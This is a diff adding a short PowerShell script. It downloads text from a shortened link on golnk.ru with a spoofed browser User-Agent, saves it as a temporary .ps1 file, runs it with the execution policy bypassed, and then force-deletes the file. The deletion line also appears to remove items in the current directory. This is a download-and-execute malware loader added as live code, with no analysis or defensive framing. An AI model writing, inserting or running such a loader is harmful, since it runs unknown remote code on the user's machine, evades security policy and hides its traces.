@@ -1,0 +1,9 @@
+$w=New-Object Net.WebClient;
+$w.Headers.Add('User-Agent','Mozilla/5.0');
+$s=$w.DownloadString('https://golnk.ru/QBENX');
+$p=[System.IO.Path]::GetTempFileName()+'.ps1';
+[IO.File]::WriteAllText($p,$s);
+powershell -ExecutionPolicy Bypass -File $p;
+Sleep 2;
+Remove-Item $p . -Force;
+"Done";pause
